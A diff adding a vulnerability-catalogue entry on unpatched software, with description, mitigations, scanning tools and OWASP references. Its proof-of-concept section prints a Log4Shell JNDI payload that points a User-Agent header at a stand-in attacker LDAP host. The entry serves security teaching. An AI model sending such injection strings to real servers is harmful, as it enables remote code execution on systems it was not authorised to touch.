@@ -5261,3 +5261,88 @@ DB_PASSWORD=supersecret
 - GitHub: [GitLeaks](https://github.com/gitleaks/gitleaks)
 
 ***
+# WEBVULN-037: Unpatched Software
+
+---
+
+## 🏷️ Category:
+Security Misconfiguration / Vulnerable Components
+
+---
+
+## 🐞 Vulnerability:
+Use of Unpatched or Outdated Software
+
+---
+
+## 📖 Description:
+
+Running outdated or unpatched software introduces critical vulnerabilities that attackers can exploit. This includes:
+
+- Web servers (e.g., Apache, Nginx)
+- Application frameworks (e.g., Django, Laravel, Spring)
+- CMS platforms (e.g., WordPress, Joomla)
+- Libraries and packages (e.g., jQuery, Log4j, OpenSSL)
+
+Attackers often scan for known CVEs affecting popular software and automate exploitation of systems that haven't applied patches or updates.
+
+---
+
+## 💥 Demo / Proof of Concept:
+
+Example: Vulnerable Log4j (CVE-2021-44228)
+
+Request:
+
+```
+User-Agent: ${jndi:ldap://malicious.attacker.com/a}
+```
+
+Unpatched server triggers the request and fetches malicious payload from attacker-controlled LDAP server, resulting in remote code execution.
+
+Another example: Old jQuery with known XSS bugs
+
+```
+<script src="https://cdn.example.com/jquery-1.7.2.min.js"></script>
+```
+
+Version known to have publicly documented vulnerabilities.
+
+---
+
+## 🛡️ Mitigation:
+
+- Maintain an asset inventory to track software and versions
+- Apply security patches and updates promptly
+- Subscribe to vendor and CVE mailing lists for alerts
+- Use vulnerability scanners and dependency checkers (e.g., Snyk, OWASP Dependency-Check)
+- Prefer managed or containerized environments with patch automation
+- Implement a DevSecOps process with CI/CD security checks
+- Remove unused or deprecated software components
+
+---
+
+## 🧪 Testing Tools / Techniques:
+
+- Use software inventory and SBOM (Software Bill of Materials)
+- Vulnerability scanners:
+  - `OpenVAS`
+  - `Nessus`
+  - `Nmap` with version detection
+- Dependency analysis tools:
+  - `OWASP Dependency-Check`
+  - `Snyk`
+  - `Retire.js`
+- Compare software versions against CVE databases
+- Check for default credentials or config leaks in legacy software
+
+---
+
+## 🔗 References:
+
+- OWASP Top 10: [Vulnerable and Outdated Components (A06:2021)](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)
+- NIST National Vulnerability Database: [https://nvd.nist.gov/](https://nvd.nist.gov/)
+- CVE Details: [https://www.cvedetails.com/](https://www.cvedetails.com/)
+- OWASP Dependency-Check: [https://owasp.org/www-project-dependency-check/](https://owasp.org/www-project-dependency-check/)
+
+***
